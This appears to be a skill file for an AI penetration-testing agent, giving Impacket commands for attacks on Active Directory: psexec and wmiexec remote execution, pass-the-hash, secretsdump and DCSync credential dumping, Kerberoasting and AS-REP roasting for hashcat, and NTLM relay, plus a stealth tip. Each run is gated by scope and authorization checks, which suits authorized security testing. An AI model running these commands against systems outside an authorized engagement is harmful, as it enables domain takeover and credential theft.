---
name: impacket
description: >
  Use for AD/Windows protocol actions with the Impacket example scripts once you have creds or
  hashes (often from netexec) — RCE (psexec/wmiexec), credential dumping (secretsdump, incl. DCSync
  -just-dc), Kerberoast (GetUserSPNs -request), AS-REP roast (GetNPUsers -request), NTLM relay
  (ntlmrelayx). Feeds hashes to hashcat. Not for attack-path mapping (bloodhound) or web (burpsuite).
arguments: "action target [-u user] [-p pass] [-hashes LM:NT] [-dc-ip ip]"
model: inherit
effort: medium
context: inline
agent:
category: ad-network
domain: ad
---

# impacket — AD/Windows protocol tools (psexec · secretsdump · GetUserSPNs · ntlmrelayx)

Shared contract: see AGENTS.md.

## Goal
Turn valid creds or hashes into concrete AD/Windows actions — a shell, dumped secrets, or roastable
tickets — via the Impacket example scripts, capturing every artifact for the report + credential store.

## Steps
1. Extract actual hosts from credential-qualified tool arguments into `HOSTS`, including DC/relay targets. `RUN="$(python3 -I scripts/otus-log.py init --engagement "$ENGAGEMENT" --skill impacket)"`; `python3 -I scripts/otus-log.py scope-check --engagement "$ENGAGEMENT" --targets-file "$HOSTS" --run-dir "$RUN"`; nonzero STOP. Scope metadata never contains passwords/hashes.
2. All commands use `python3 -I scripts/otus-log.py run --run-dir "$RUN" --targets-file "$HOSTS" -- <original argv>`. RCE argv: `psexec.py 'DOMAIN/user:password@TARGET'` or `wmiexec.py 'DOMAIN/user:password@TARGET'`; pass-the-hash adds original `-hashes LMHASH:NTHASH`. Do not invoke interactive forms: if no bounded one-shot form is available, stop and record the limitation.
3. **Credential dumping:** `secretsdump.py 'DOMAIN/user:password@TARGET' -outputfile "$RUN/loot/secrets"`; DCSync from a DC: `secretsdump.py 'DOMAIN/user:password@DC' -just-dc -outputfile "$RUN/loot/ntds"`.
4. **Roasting → hashcat** (hashcat format): `GetUserSPNs.py 'DOMAIN/user:password' -dc-ip <DC> -request -outputfile "$RUN/loot/kerberoast.txt"` and `GetNPUsers.py 'DOMAIN/' -usersfile users.txt -request -format hashcat -outputfile "$RUN/loot/asrep.txt"`.
5. Relay argv `ntlmrelayx.py -tf targets.txt -smb2support -of "$RUN/loot/relay"` must cover only checked targets and satisfy non-interactive/bounded rules; never use `-i` or hold a listener. `python3 -I scripts/otus-log.py finish --run-dir "$RUN" --status "$STATUS" --summary "$SUMMARY" --item 'scope-confirmed=ok:../../scope.json' --item 'action-executed=ok:run.log' --item 'results-recorded=ok:findings.md'`; add secret-free verified findings and actual artifacts/cleanup, or `no artifacts captured`.

## Modern tooling & alternatives
Install via `pipx install impacket` (scripts as `psexec.py` or `impacket-psexec`). `netexec` wraps many
actions at scale; `certipy`/`rubeus` cover AD CS / Kerberos. Prefer `wmiexec`/`smbexec` over `psexec` for stealth.

## Checklist
```yaml
checklist:
  - id: scope-confirmed
    desc: Explicit engagement authorization, every endpoint, and credential/hash use checked
    verify: judge
    evidence: ../../scope.json
    on_fail: fail
    required: true
  - id: action-executed
    desc: An impacket action ran and was logged (exec/dump/roast/relay)
    verify: nonempty
    evidence: run.log
    on_fail: redo-skill
    required: true
  - id: loot-captured
    desc: Artifacts (secrets/tickets/roast hashes) saved under loot/ via -outputfile
    verify: exists
    evidence: loot
    on_fail: redo-part
    required: false
  - id: results-recorded
    desc: Run marker written (even when no artifacts captured)
    verify: nonempty
    evidence: findings.md
    on_fail: redo-skill
    required: true
```

## Notes / pitfalls
- Target format `[[domain/]username[:password]@]<target>`; pass-the-hash uses `-hashes LMHASH:NTHASH` (omit password); `-k`/`-no-pass` for Kerberos.
- `secretsdump -just-dc` is **DCSync** — needs replication rights, high-signal; dump the minimum. Request roast hashes with `-format hashcat` so they drop into `hashcat`.
- psexec creates a service: capture cleanup proof. No captured artifacts still finishes with an explicit summary.
